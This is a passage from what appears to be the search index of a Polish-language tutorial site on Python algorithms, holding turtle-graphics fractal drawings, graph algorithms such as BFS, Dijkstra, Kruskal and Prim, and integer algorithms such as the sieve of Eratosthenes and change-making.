\"eogrungrmeixpcx\"\nkey = \"cat\"\n\ndecrypted = decrypt_vigenere(message, key)\n\nprint(decrypted)\n</code></pre>"},{"location":"programming/python/algorithms/fractals/binary-tree/","title":"Drzewo binarne","text":""},{"location":"programming/python/algorithms/fractals/binary-tree/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/binary-tree/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef binary_tree(rank: int, length: float):\n    turtle.forward(length)\n\n    if rank &gt; 0:\n        turtle.left(45)\n        binary_tree(rank - 1, length / 2)\n        turtle.right(90)\n        binary_tree(rank - 1, length / 2)\n        turtle.left(45)\n\n    turtle.back(length)\n\nturtle.speed(0)\nturtle.penup()\nturtle.left(90)\nturtle.back(350)\nturtle.pendown()\nturtle.pensize(3)\n\nbinary_tree(5, 400)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/binary-tree/#link-do-implementacji","title":"Link do implementacji","text":"<p>Drzewo binarne</p>"},{"location":"programming/python/algorithms/fractals/binary-tree/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>binary_tree</code> (linia 4) przyjmuje dwa argumenty: stopie\u0144 drzewa i pocz\u0105tkow\u0105 d\u0142ugo\u015b\u0107 ga\u0142\u0119zi (pnia). Na pocz\u0105tku przemieszczamy \u017c\u00f3\u0142wia do przodu o zadan\u0105 d\u0142ugo\u015b\u0107 (linia 5), rysuj\u0105c w ten spos\u00f3b ga\u0142\u0105\u017a. Nast\u0119pnie, je\u017celi stopie\u0144 jest wi\u0119kszy od zera (linia 7), to znaczy, \u017ce musimy narysowa\u0107 kolejne ga\u0142\u0119zie. W tym celu obracamy najpierw \u017c\u00f3\u0142wia w lewo o \\(45\\degree\\) (linia 8) i wywo\u0142aniem rekurencyjnym (linia 9) rysujemy ga\u0142\u0119zie. Podobnie post\u0119pujemy z drugim rozga\u0142\u0119zieniem. Najpierw musimy obr\u00f3ci\u0107 \u017c\u00f3\u0142wia w prawo o \\(90\\degree\\) (linia 10), czyli \\(2*45\\degree\\). Nast\u0119pnie stosujemy wywo\u0142anie rekurencyjne (linia 11), a potem obracamy \u017c\u00f3\u0142wia w lewo o \\(45\\degree\\) (linia 12), w ten spos\u00f3b wracaj\u0105c do pocz\u0105tkowego ustawienia.</p> <p>Na koniec, po ewentualnym narysowaniu rozga\u0142\u0119zie\u0144, cofamy \u017c\u00f3\u0142wia o zadan\u0105 d\u0142ugo\u015b\u0107 (linia 14), tym samym wracaj\u0105c do ustawienia z pocz\u0105tku wywo\u0142ania funkcji.</p> <p>W kodzie g\u0142\u00f3wnym ustawiamy \u017c\u00f3\u0142wia tak, aby rysowane drzewo mie\u015bci\u0142o si\u0119 na ekranie (linie 17-22). Nast\u0119pnie rysujemy drzewo binarne za pomoc\u0105 naszej funkcji <code>binary_tree</code> (linia 24), a na koniec ko\u0144czymy dzia\u0142anie \u017c\u00f3\u0142wia (linia 26).</p>"},{"location":"programming/python/algorithms/fractals/cantor-dust/","title":"Zbi\u00f3r Cantora","text":""},{"location":"programming/python/algorithms/fractals/cantor-dust/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/cantor-dust/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef cantor_dust(rank, length):\n    if rank &gt; 0:\n        cantor_dust(rank - 1, length / 3)\n        turtle.penup()\n        turtle.forward(length / 3)\n        turtle.pendown()\n        cantor_dust(rank - 1, length / 3)\n    else:\n        turtle.forward(length)\n\ndef cantor(rank, length):\n    for i in range(rank + 1):\n        cantor_dust(i, length)\n        turtle.penup()\n        turtle.back(length)\n        turtle.right(90)\n        turtle.forward(20)\n        turtle.left(90)\n        turtle.pendown()\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(250)\nturtle.pendown()\n\ncantor(5, 729)\n\nturtle.hideturtle()\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/cantor-dust/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Cantor-Dust#main.py</p>"},{"location":"programming/python/algorithms/fractals/dragon-curve/","title":"Smocza krzywa","text":""},{"location":"programming/python/algorithms/fractals/dragon-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/dragon-curve/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef dragon_curve(rank, sign, length):\n    if rank &gt; 0:\n        turtle.left(45 * sign)\n        dragon_curve(rank - 1, 1, length)\n        turtle.right(90 * sign * -1)\n        dragon_curve(rank - 1, -1, length)\n        turtle.left(45 * sign)\n    else:\n        turtle.forward(length)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(150)\nturtle.left(90)\nturtle.forward(150)\nturtle.right(90)\nturtle.pendown()\n\ndragon_curve(10, 1, 5)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/dragon-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Dragon-Curve#main.py</p>"},{"location":"programming/python/algorithms/fractals/koch-curve/","title":"Krzywa Kocha","text":""},{"location":"programming/python/algorithms/fractals/koch-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/koch-curve/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef koch_curve(rank, length):\n    if rank &gt; 0:\n        koch_curve(rank - 1, length / 2)\n        turtle.left(60)\n        koch_curve(rank - 1, length / 2)\n        turtle.right(120)\n        koch_curve(rank - 1, length / 2)\n        turtle.left(60)\n        koch_curve(rank - 1, length / 2)\n    else:\n        turtle.forward(length)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(350)\nturtle.pendown()\n\nkoch_curve(3, 200)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/koch-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Koch-Curve#main.py</p>"},{"location":"programming/python/algorithms/fractals/koch-snowflake/","title":"P\u0142atek Kocha","text":""},{"location":"programming/python/algorithms/fractals/koch-snowflake/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/koch-snowflake/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef koch_curve(rank, length):\n    if rank &gt; 0:\n        koch_curve(rank - 1, length / 2)\n        turtle.left(60)\n        koch_curve(rank - 1, length / 2)\n        turtle.right(120)\n        koch_curve(rank - 1, length / 2)\n        turtle.left(60)\n        koch_curve(rank - 1, length / 2)\n    else:\n        turtle.forward(length)\n\ndef koch_snowflake(rank, length):\n    for i in range(0, 3):\n        koch_curve(rank, length)\n        turtle.right(120)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(350)\nturtle.pendown()\n\nkoch_snowflake(3, 100)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/koch-snowflake/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Koch-Snowflake#main.py</p>"},{"location":"programming/python/algorithms/fractals/minkowski-sausage/","title":"Minkowski Sausage","text":""},{"location":"programming/python/algorithms/fractals/minkowski-sausage/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/minkowski-sausage/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef minkowski_curve(rank, length):\n    if rank &gt; 0:\n        turtle.right(30)\n        minkowski_curve(rank - 1, length / 2)\n        turtle.left(90)\n        minkowski_curve(rank - 1, length / 2)\n        turtle.right(90)\n        minkowski_curve(rank - 1, length / 2)\n        turtle.left(30)\n    else:\n        turtle.forward(length)\n\ndef minkowski_sausage(rank, length):\n    for i in range(0, 4):\n        minkowski_curve(rank, length)\n        turtle.right(90)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(150)\nturtle.pendown()\n\nminkowski_sausage(3, 100)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/minkowski-sausage/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Minkowski-Sausage#main.py</p>"},{"location":"programming/python/algorithms/fractals/peano-curve/","title":"Krzywa Peano","text":""},{"location":"programming/python/algorithms/fractals/peano-curve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/peano-curve/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef peano_curve(rank, angle, length):\n    if rank &gt; 0:\n        turtle.right(angle)\n        peano_curve(rank - 1, -angle, length)\n        turtle.forward(length)\n        peano_curve(rank - 1, angle, length)\n        turtle.forward(length)\n        peano_curve(rank - 1, -angle, length)\n        turtle.left(angle)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(150)\nturtle.left(90)\nturtle.forward(150)\nturtle.right(90)\nturtle.pendown()\n\npeano_curve(4, 90, 20)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/peano-curve/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Peano-Curve#main.py</p>"},{"location":"programming/python/algorithms/fractals/sierpinski-square/","title":"Kwadrat Sierpi\u0144skiego","text":""},{"location":"programming/python/algorithms/fractals/sierpinski-square/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/sierpinski-square/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef sierpinski_square(rank, length):\n    if rank == 0:\n        turtle.begin_fill()\n        for _ in range(4):\n            turtle.forward(length)\n            turtle.left(90)\n        turtle.end_fill()\n        return\n\n    for _ in range(4):\n        for _ in range(2):\n            turtle.forward(length / 3)\n            sierpinski_square(rank - 1, length / 3)\n        turtle.forward(length / 3)\n        turtle.left(90)\n\nturtle.color('blue')\nturtle.speed(0)\nturtle.penup()\nturtle.back(200)\nturtle.pendown()\n\nsierpinski_square(3, 300)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/sierpinski-square/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Sierpinski-Square#main.py</p>"},{"location":"programming/python/algorithms/fractals/sierpinski-triangle/","title":"Tr\u00f3jk\u0105t Sierpi\u0144skiego","text":""},{"location":"programming/python/algorithms/fractals/sierpinski-triangle/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/fractals/sierpinski-triangle/#implementacja","title":"Implementacja","text":"<pre><code>import turtle\n\ndef sierpinski_triangle(rank, length):\n    if rank == 0:\n        turtle.begin_fill()\n        for _ in range(3):\n            turtle.forward(length)\n            turtle.left(120)\n        turtle.end_fill()\n        return\n\n    for _ in range(3):\n        sierpinski_triangle(rank - 1, length / 2)\n        turtle.forward(length)\n        turtle.left(120)\n\nturtle.speed(0)\nturtle.penup()\nturtle.back(200)\nturtle.pendown()\n\nsierpinski_triangle(4, 300)\n\nturtle.done()\n</code></pre>"},{"location":"programming/python/algorithms/fractals/sierpinski-triangle/#link-do-implementacji","title":"Link do implementacji","text":"<p>https://replit.com/@damiankurpiewski/Sierpinski-Triangle#main.py</p>"},{"location":"programming/python/algorithms/graphs/bfs/","title":"BFS","text":""},{"location":"programming/python/algorithms/graphs/bfs/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/bfs/#implementacja","title":"Implementacja","text":"<pre><code>from typing import List\nfrom queue import Queue\n\ndef bfs(graph: List[List[int]], visited: List[bool], node: int):\n    q = Queue()\n    q.put(node)\n\n    while not q.empty():\n        node = q.get()\n\n        if visited[node]:\n            continue\n\n        visited[node] = True\n        print(node)\n\n        for new_node in graph[node]:\n            if not visited[new_node]:\n                q.put(new_node)\n\ngraph = [\n    [1, 6],\n    [0, 6, 3, 2],\n    [1, 3],\n    [2, 1, 6, 4, 5],\n    [3, 5],\n    [4, 3, 6],\n    [0, 1, 3, 5],\n]\n\nvisited = [False] * len(graph)\n\nbfs(graph, visited, 0)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/connected-components/","title":"Sp\u00f3jne sk\u0142adowe","text":""},{"location":"programming/python/algorithms/graphs/connected-components/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/connected-components/#implementacja","title":"Implementacja","text":"<pre><code>from typing import List\n\ndef dfs(graph: List[List[int]], visited: List[bool], node: int):\n    if visited[node]:\n        return\n\n    visited[node] = True\n\n    for new_node in graph[node]:\n        if not visited[new_node]:\n            dfs(graph, visited, new_node)\n\ndef count_connected_components(graph: List[List[int]]) -&gt; int:\n    result = 0\n    visited = [False] * len(graph)\n\n    for node, vis in enumerate(visited):\n        if not vis:\n            result += 1\n            dfs(graph, visited, node)\n\n    return result\n\ngraph = [\n    [1, 6],\n    [0, 6, 3, 2],\n    [1, 3],\n    [2, 1, 6, 4, 5],\n    [3, 5],\n    [4, 3, 6],\n    [0, 1, 3, 5]\n]\n\nresult = count_connected_components(graph)\n\nprint(\"Number of connected components in the graph:\", result)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/dfs/","title":"DFS","text":""},{"location":"programming/python/algorithms/graphs/dfs/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/dfs/#implementacja","title":"Implementacja","text":"<pre><code>from typing import List\n\ndef dfs(graph: List[List[int]], visited: List[bool], node: int):\n    if visited[node]:\n        return\n\n    visited[node] = True\n    print(node)\n\n    for new_node in graph[node]:\n        if not visited[new_node]:\n            dfs(graph, visited, new_node)\n\ngraph = [\n    [1, 6],\n    [0, 6, 3, 2],\n    [1, 3],\n    [2, 1, 6, 4, 5],\n    [3, 5],\n    [4, 3, 6],\n    [0, 1, 3, 5],\n]\n\nvisited = [False] * len(graph)\n\ndfs(graph, visited, 0)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/dijkstra/","title":"Dijkstra","text":""},{"location":"programming/python/algorithms/graphs/dijkstra/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/dijkstra/#implementacja","title":"Implementacja","text":"<pre><code>from math import inf\nfrom typing import List\nfrom queue import Queue\nfrom collections import namedtuple\n\nEdge = namedtuple('Edge', ['start', 'end', 'cost'])\n\ndef dijkstra(graph: List[List[Edge]], node: int) -&gt; List[int]:\n    q = Queue()\n    distances = [inf] * len(graph)\n\n    distances[node] = 0\n\n    for edge in graph[node]:\n        q.put(edge)\n\n    while not q.empty():\n        current_edge = q.get()\n        new_distance = distances[current_edge.start] + current_edge.cost\n\n        if new_distance &lt; distances[current_edge.end]:\n            distances[current_edge.end] = new_distance\n\n            for edge in graph[current_edge.end]:\n                q.put(edge)\n\n    return distances\n\ngraph = [\n    [Edge(0, 1, 5), Edge(0, 6, 5)],\n    [Edge(1, 0, 5), Edge(1, 6, 5), Edge(1, 3, 3), Edge(1, 2, 3)],\n    [Edge(2, 1, 3), Edge(2, 3, 1)],\n    [Edge(3, 2, 1), Edge(3, 1, 3), Edge(3, 6, 3), Edge(3, 4, 5), Edge(3, 5, 4)],\n    [Edge(4, 3, 5), Edge(4, 5, 2)],\n    [Edge(5, 4, 2), Edge(5, 3, 4), Edge(5, 6, 5)],\n    [Edge(6, 0, 5), Edge(6, 1, 5), Edge(6, 3, 3), Edge(6, 5, 5)],\n]\n\ndistances = dijkstra(graph, 0)\n\nprint(distances)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/flood-fill/","title":"Flood fill","text":""},{"location":"programming/python/algorithms/graphs/flood-fill/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/flood-fill/#implementacja","title":"Implementacja","text":"<pre><code>from pprint import pprint\n\ndef flood_fill(image, row, column, symbol=\"*\"):\n    if image[row][column] != \" \":\n        return\n\n    image[row][column] = symbol\n    directions = [(1, 0), (-1, 0), (0, 1), (0, -1)]\n\n    for direct in directions:\n        r, c = direct\n        flood_fill(image, row + r, column + c)\n\nimage = [\n    list(\"########\"),\n    list(\"#  #   #\"),\n    list(\"#  #   #\"),\n    list(\"#  #   #\"),\n    list(\"### ####\"),\n    list(\"#  #   #\"),\n    list(\"#  #   #\"),\n    list(\"########\")\n]\n\npprint(image)\nprint()\n\nflood_fill(image, 1, 1)\n\npprint(image)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/floyd-warshall/","title":"Floyd-Warshall","text":""},{"location":"programming/python/algorithms/graphs/floyd-warshall/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/floyd-warshall/#implementacja","title":"Implementacja","text":"<pre><code>import math\nfrom typing import List\nfrom pprint import pprint\n\ndef floyd_warshall(graph: List[List[int]]):\n    for k in range(len(graph)):\n        for i in range(len(graph)):\n            for j in range(len(graph)):\n                if i == j or k == i or k == j:\n                    continue\n\n                if graph[i][k] + graph[k][j] &lt; graph[i][j]:\n                    graph[i][j] = graph[i][k] + graph[k][j]\n\nf = math.inf\ngraph = [\n    [0, 5, f, f, f, f, 5],\n    [5, 0, 3, 3, f, f, 5],\n    [f, 3, 0, 1, f, f, f],\n    [f, 3, 1, 0, 5, 4, 3],\n    [f, f, f, 5, 0, 2, f],\n    [f, f, f, 4, 2, 0, 5],\n    [5, 5, f, 3, f, 5, 0],\n]\n\nfloyd_warshall(graph)\n\npprint(graph)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/kruskal/","title":"Kruskal","text":""},{"location":"programming/python/algorithms/graphs/kruskal/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/kruskal/#implementacja","title":"Implementacja","text":"<pre><code>import heapq\n\nclass DisjointUnion:\n    class Node:\n        def __init__(self, parent: int, rank: int):\n            self.parent = parent\n            self.rank = rank\n\n    def __init__(self, number_of_nodes: int):\n        self._subsets = [self.Node(i, 0) for i in range(number_of_nodes)]\n\n    def union(self, el1: int, el2: int):\n        x_root = self.find(el1)\n        y_root = self.find(el2)\n\n        if self._subsets[x_root].rank &lt; self._subsets[y_root].rank:\n            self._subsets[x_root].parent = y_root\n        elif self._subsets[x_root].rank &gt; self._subsets[y_root].rank:\n            self._subsets[y_root].parent = x_root\n        else:\n            self._subsets[y_root].parent = x_root\n            self._subsets[x_root].rank += 1\n\n    def is_in_union(self, el1: int, el2: int) -&gt; bool:\n        return self.find(el1) == self.find(el2)\n\n    def find(self, node_number: int) -&gt; int:\n        if self._subsets[node_number].parent != node_number:\n            self._subsets[node_number].parent = self.find(self._subsets[node_number].parent)\n\n        return self._subsets[node_number].parent\n\nclass Edge:\n\n  def __init__(self, node_from: int, node_to: int, distance: int):\n    self.node_from = node_from\n    self.node_to = node_to\n    self.distance = distance\n\n  def __lt__(self, other) -&gt; bool:\n    return self.distance &lt; other.distance\n\n  def __str__(self) -&gt; str:\n    return f\"{self.node_from} &lt;-({self.distance})-&gt; {self.node_to}\"\n\n  def __repr__(self) -&gt; str:\n    return self.__str__()\n\ndef kruskal(graph: list) -&gt; list:\n  edges = []\n  connected_nodes = DisjointUnion(len(graph))\n\n  min_spanning_tree = []\n\n  for nodes_list in graph:\n    for node in nodes_list:\n      edges.append(node)\n\n  heapq.heapify(edges)\n  while edges:\n    current = heapq.heappop(edges)\n\n    if connected_nodes.is_in_union(current.node_from, current.node_to):\n      continue\n\n    connected_nodes.union(current.node_from, current.node_to)\n    min_spanning_tree.append(current)\n\n  return min_spanning_tree\n\nif __name__ == \"__main__\":\n  graph = [[Edge(0, 1, 5), Edge(0, 6, 5)],\n           [Edge(1, 0, 5),\n            Edge(1, 6, 5),\n            Edge(1, 3, 3),\n            Edge(1, 2, 3)], [Edge(2, 1, 3), Edge(2, 3, 1)],\n           [\n             Edge(3, 2, 1),\n             Edge(3, 1, 3),\n             Edge(3, 6, 3),\n             Edge(3, 4, 5),\n             Edge(3, 5, 4)\n           ], [Edge(4, 3, 5), Edge(4, 5, 2)],\n           [Edge(5, 4, 2), Edge(5, 3, 4),\n            Edge(5, 6, 5)],\n           [Edge(6, 0, 5),\n            Edge(6, 1, 5),\n            Edge(6, 3, 3),\n            Edge(6, 5, 5)]]\n\n  min_spanning_tree = kruskal(graph)\n\n  print(min_spanning_tree)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/prim/","title":"Prim","text":""},{"location":"programming/python/algorithms/graphs/prim/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/prim/#implementacja","title":"Implementacja","text":"<pre><code>import heapq\n\nclass Edge:\n\n  def __init__(self, node_from: int, node_to: int, distance: int):\n    self.node_from = node_from\n    self.node_to = node_to\n    self.distance = distance\n\n  def __lt__(self, other) -&gt; bool:\n    return self.distance &lt; other.distance\n\n  def __str__(self) -&gt; str:\n    return f\"{self.node_from} &lt;-({self.distance})-&gt; {self.node_to}\"\n\n  def __repr__(self) -&gt; str:\n    return self.__str__()\n\ndef prim(graph: list, node: int) -&gt; list:\n  visited = [False] * len(graph)\n  visited[node] = True\n\n  min_spanning_tree = []\n\n  edges = graph[node][:]\n\n  heapq.heapify(edges)\n\n  while edges:\n    current = heapq.heappop(edges)\n\n    if visited[current.node_to]:\n      continue\n\n    visited[current.node_to] = True\n    min_spanning_tree.append(current)\n\n    for next in graph[current.node_to]:\n      if not visited[next.node_to]:\n        heapq.heappush(edges, next)\n\n  return min_spanning_tree\n\nif __name__ == \"__main__\":\n  graph = [[Edge(0, 1, 5), Edge(0, 6, 5)],\n           [Edge(1, 0, 5),\n            Edge(1, 6, 5),\n            Edge(1, 3, 3),\n            Edge(1, 2, 3)], [Edge(2, 1, 3), Edge(2, 3, 1)],\n           [\n             Edge(3, 2, 1),\n             Edge(3, 1, 3),\n             Edge(3, 6, 3),\n             Edge(3, 4, 5),\n             Edge(3, 5, 4)\n           ], [Edge(4, 3, 5), Edge(4, 5, 2)],\n           [Edge(5, 4, 2), Edge(5, 3, 4),\n            Edge(5, 6, 5)],\n           [Edge(6, 0, 5),\n            Edge(6, 1, 5),\n            Edge(6, 3, 3),\n            Edge(6, 5, 5)]]\n\n  min_spanning_tree = prim(graph, 0)\n\n  print(min_spanning_tree)\n</code></pre>"},{"location":"programming/python/algorithms/graphs/topological-sort/","title":"Sortowanie topologiczne","text":""},{"location":"programming/python/algorithms/graphs/topological-sort/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/graphs/topological-sort/#implementacja","title":"Implementacja","text":"<pre><code>def topological_sort(graph: list) -&gt; list:\n  in_ranks = [0] * len(graph)\n  removed = [False] * len(graph)\n  result = []\n\n  for neighbours_list in graph:\n    for node in neighbours_list:\n        in_ranks[node] += 1\n\n  change = True\n\n  while change and len(result) &lt; len(graph):\n    change = False\n\n    for i, neighbours_list in enumerate(graph):\n      if removed[i] or in_ranks[i] &gt; 0:\n        continue\n\n      change = True\n      result.append(i)\n      removed[i] = True\n\n      for node in neighbours_list:\n          in_ranks[node] -= 1\n\n  return result\n\ngraph = [\n        [2],\n        [0, 2],\n        [],\n        [1, 0, 4],\n        [2, 1],\n        [0, 4],\n]\n\nresult = topological_sort(graph)\n\nif len(result) &lt; len(graph):\n  print(\"Graph has a cycle\")\nelse:\n  print(\" \".join(map(str, result)))\n</code></pre>"},{"location":"programming/python/algorithms/integers/change/","title":"Wydawanie reszty","text":""},{"location":"programming/python/algorithms/integers/change/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/change/#podejscie-zachanne","title":"Podej\u015bcie zach\u0142anne","text":"<pre><code>def change_greedy(amount: int, coins: list) -&gt; int:\n    result = i = 0\n\n    while amount &gt; 0:\n        result += amount // coins[i]\n        amount %= coins[i]\n        i += 1\n\n    return result\n\ncoins = [200, 100, 50, 20, 10, 5, 2, 1]\namount = 589\n\nresult = change_greedy(amount, coins)\n\nprint(\"Greedy algorithm\")\nprint(f\"Amount {amount} can be given out using {result} coins\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/change/#podejscie-dynamiczne","title":"Podej\u015bcie dynamiczne","text":"<pre><code>from math import inf\n\ndef change_dynamic(amount: int, coins: list):\n    partial_results = [inf] * (amount + 1)\n    used_coins = [inf] * (amount + 1)\n\n    partial_results[0] = 0\n\n    for coin_value in coins:\n        for i in range(0, amount - coin_value + 1):\n            if partial_results[i] + 1 &lt; partial_results[i + coin_value]:\n                partial_results[i + coin_value] = partial_results[i] + 1\n                used_coins[i + coin_value] = coin_value\n\n    if partial_results[amount] == inf:\n        print(\"Cannot give out specified value using given coins\")\n        return\n\n    print(f\"Amount {amount} can be given out using {partial_results[amount]} coins\")\n    print(\"Used coins:\")\n\n    i = amount\n    while i &gt; 0:\n        print(used_coins[i])\n        i -= used_coins[i]\n\ncoins = [1, 2, 7, 10]\namount = 14\n\nprint(\"Dynamic algorithm\")\nchange_dynamic(amount, coins)\n</code></pre>"},{"location":"programming/python/algorithms/integers/change/#opis-implementacji","title":"Opis implementacji","text":"<p>Funkcja <code>change_dynamic</code> przyjmuje dwa parametry: kwot\u0119 do wydania (<code>amount</code>) i list\u0119 dost\u0119pnych nomina\u0142\u00f3w (<code>coins</code>).</p> <p>Na pocz\u0105tku funkcji przygotowujemy stosowne listy do przechowywania warto\u015bci cz\u0119\u015bciowych wynik\u00f3w i wykorzystanych nomina\u0142\u00f3w. </p> <p>Nast\u0119pnie przechodzimy p\u0119tl\u0105 przez wszystkie nomina\u0142y. </p> <p>Dla ka\u017cdego nomina\u0142u przechodzimy przez odpowiednie pola tablicy. W zale\u017cno\u015bci od warto\u015bci pola, dokonujemy zmiany.</p> <p>Je\u017celi po przetworzeniu wszystkich nomina\u0142\u00f3w ostatnie pole tablicy wci\u0105\u017c ma warto\u015b\u0107 r\u00f3wn\u0105 niesko\u0144czono\u015bci, to wypisujemy odpowiedni komunikat o braku mo\u017cliwo\u015bci wydania podanej kwoty i ko\u0144czymy dzia\u0142anie funkcji.</p>"},{"location":"programming/python/algorithms/integers/divisors/","title":"Wszystkie dzielniki","text":""},{"location":"programming/python/algorithms/integers/divisors/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/divisors/#rozwiazanie-zupenie-naiwne","title":"Rozwi\u0105zanie zupe\u0142nie naiwne","text":"<pre><code>def divisors(n: int):\n    for i in range(1, n + 1):\n        if n % i == 0:\n            print(i)\n\nn = 12\n\ndivisors(n)\n</code></pre>"},{"location":"programming/python/algorithms/integers/divisors/#rozwiazanie-naiwne","title":"Rozwi\u0105zanie naiwne","text":"<pre><code>def divisors(n: int):\n    for i in range(1, (n // 2) + 1):\n        if n % i == 0:\n            print(i)\n\n    if n &gt; 1:\n        print(n)\n\nn = 12\n\ndivisors(n)\n</code></pre>"},{"location":"programming/python/algorithms/integers/divisors/#rozwiazanie-optymalne","title":"Rozwi\u0105zanie optymalne","text":"<pre><code>def divisors(n: int):\n    i = 1\n    while i * i &lt;= n:\n        if n % i == 0:\n            print(i)\n            if i != (n // i):\n                print(n // i)\n        i += 1\n\nn = 12\n\ndivisors(n)\n</code></pre>"},{"location":"programming/python/algorithms/integers/double-factorial/","title":"Podw\u00f3jna silnia","text":""},{"location":"programming/python/algorithms/integers/double-factorial/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/double-factorial/#implementacja","title":"Implementacja","text":"<pre><code>def double_factorial(n: int) -&gt; int:\n    result = 1\n    for i in range(n, 0, -2):\n        result *= i\n\n    return result\n\nn = 8\n\nresult = double_factorial(n)\n\nprint(f\"{n}!! = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/eratosthenes-sieve/","title":"Sito Eratostenesa","text":""},{"location":"programming/python/algorithms/integers/eratosthenes-sieve/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/eratosthenes-sieve/#implementacja","title":"Implementacja","text":"<pre><code>def sieve(n: int) -&gt; list:\n    primes = [False, False] + [True] * (n - 1)\n    i = 2\n    while i * i &lt;= n:\n        if not primes[i]:\n            i += 1\n            continue\n\n        for j in range(2 * i, n + 1, i):\n            primes[j] = False\n\n        i += 1\n\n    return primes\n\ndef print_prime_numbers(primes: list):\n    for i, is_prime in enumerate(primes):\n        if is_prime:\n            print(i)\n\nn = 100\n\nprimes = sieve(n)\n\nprint_prime_numbers(primes)\n</code></pre>"},{"location":"programming/python/algorithms/integers/extended-euclidean/","title":"Rozszerzony algorytm Euklidesa","text":""},{"location":"programming/python/algorithms/integers/extended-euclidean/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/extended-euclidean/#implementacja","title":"Implementacja","text":"<pre><code>def extended_gcd(a: int, b: int) -&gt; tuple:\n  old_x, x = 1, 0\n  old_y, y = 0, 1\n  rest, old_rest = b, a\n\n  while rest != 0:\n    quotient = old_rest // rest\n\n    old_x, x = x, old_x - quotient * x\n    old_y, y = y, old_y - quotient * y\n    old_rest, rest = rest, old_rest - quotient * rest\n\n  return old_rest, old_x, old_y\n\na = 6\nb = 21\n\ngcd, x, y = extended_gcd(a, b)\n\nprint(f\"{a} * {x} + {b} * {y} = {gcd}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/fibonacci-numbers/","title":"Liczby Fibonacciego","text":""},{"location":"programming/python/algorithms/integers/fibonacci-numbers/#opis-problemu","title":"Opis problemu","text":""},{"location":"programming/python/algorithms/integers/fibonacci-numbers/#wersja-iteracyjna","title":"Wersja iteracyjna","text":"<pre><code>def fib(n: int) -&gt; int:\n    f1 = 1\n    f2 = 1\n\n    for _ in range(3, n + 1):\n        f1, f2 = f2, f1 + f2\n\n    return f2\n\nn = 10\n\nresult = fib(n)\n\nprint(f\"fib({n}) = {result}\")\n</code></pre>"},{"location":"programming/python/algorithms/integers/fibonacci-numbers/#wersja-rekurencyjna","title":"Wersja rekurencyjna","text":"<pre><code>def fib(n: int) -&gt; int:\n    if n &lt;= 2:\n        return 1\n\n    return fib(n - 1) + fib(n - 